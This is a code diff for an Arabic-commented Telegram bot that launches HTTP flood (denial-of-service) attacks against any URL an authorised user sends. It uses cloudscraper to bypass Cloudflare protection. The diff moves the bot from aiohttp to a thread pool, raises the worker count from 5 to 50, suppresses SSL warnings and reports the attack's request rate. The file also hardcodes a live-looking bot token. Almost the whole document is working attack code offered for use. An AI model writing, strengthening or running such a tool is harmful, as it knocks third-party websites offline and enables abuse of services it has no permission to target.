@@ -1,15 +1,13 @@
-
 import telebot
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 import cloudscraper
 import threading
-import aiohttp
-import asyncio
+from concurrent.futures import ThreadPoolExecutor
+import urllib3
 import time
 
 # تعطيل التحقق من صحة شهادة SSL
-import ssl
-ssl._create_default_https_context = ssl._create_unverified_context
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 scraper = cloudscraper.create_scraper()  # إنشاء كائن scraper لتجاوز Cloudflare
 headers = {
@@ -27,36 +25,14 @@ bot = telebot.TeleBot('7317402155:AAHNB3hgGqKXiLqF1OhTYLG78HmTlm8dYI4')
 attack_in_progress = False
 attack_lock = threading.Lock()
 
-async def attack(url, session):
+def attack(url):
     global attack_in_progress
     try:
         while attack_in_progress:
-            async with session.get(url, headers=headers) as response:
-                print("تم إرسال الطلب إلى:", url)
-                # هنا يمكن إضافة المزيد من المعالجة إذا لزم الأمر
+            response = scraper.get(url, headers=headers)  # استخدام scraper بدلاً من requests
+            print("تم إرسال الطلب إلى:", url)
     except Exception as e:
         print("حدث خطأ:", e)
-
-def start_attack_task(url, num_repeats, max_workers, num_requests):
-    global attack_in_progress
-    loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(loop)
-    start_time = time.time()
-
-    async def main():
-        async with aiohttp.ClientSession() as session:
-            tasks = []
-            for _ in range(num_repeats):
-                for _ in range(num_requests):
-                    tasks.append(attack(url, session))
-            await asyncio.gather(*tasks)
-
-    loop.run_until_complete(main())
-    end_time = time.time()
-
-    elapsed_time = end_time - start_time
-    requests_per_second = num_requests * num_repeats / elapsed_time
-    print(f"نسبة إرسال الطلبات: {requests_per_second:.2f} طلب/ثانية")
 
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
@@ -71,14 +47,16 @@ def stop_attack(message):
     bot.send_message(message.chat.id, "الهجوم تم إيقافه بنجاح.")
 
 @bot.message_handler(commands=['attack'])
-def handle_attack(message):
+def start_attack(message):
     global attack_in_progress
     if str(message.chat.id) in Owner or str(message.chat.id) in NormalUsers:
         url = message.text.split()[1]  # افتراض أن الرابط يأتي بعد الأمر مباشرة
         num_repeats = int(message.text.split()[2]) if len(message.text.split()) > 2 else 1
         
+        start_time = time.time()  # بدء المؤقت
+
         # زيادة عدد الخيوط
-        max_workers = 5  # يمكنك تعديل هذا الرقم بناءً على قدرة جهازك والهدف
+        max_workers = 50  # يمكنك تعديل هذا الرقم بناءً على قدرة جهازك والهدف
         num_requests = 100  # يمكنك أيضاً تعديل عدد الطلبات
 
         with attack_lock:
@@ -86,8 +64,23 @@ def handle_attack(message):
 
         bot.send_message(message.chat.id, f"الهجوم بدأ على {url} بعدد مرات تكرار {num_repeats}.")
 
-        attack_thread = threading.Thread(target=start_attack_task, args=(url, num_repeats, max_workers, num_requests))
-        attack_thread.start()
+        for _ in range(num_repeats):
+            with ThreadPoolExecutor(max_workers=max_workers) as executor:
+                for _ in range(num_requests):
+                    executor.submit(attack, url)
+
+        end_time = time.time()  # انتهاء المؤقت
+
+        # حساب الزمن المستغرق
+        elapsed_time = end_time - start_time
+
+        # حساب نسبة الإرسال بالطلبات في الثانية
+        requests_per_second = num_requests * num_repeats / elapsed_time
+        bot.reply_to(message, f"نسبة إرسال الطلبات: {requests_per_second:.2f} طلب/ثانية")
+
+        # استخدام session
+        response = scraper.get(url, headers=headers)  # استخدام scraper بدلاً من requests
+        bot.reply_to(message, response.text)
     else:
         bot.reply_to(message, "عذراً، أنت غير مصرح لك باستخدام هذه الأداة.")
 
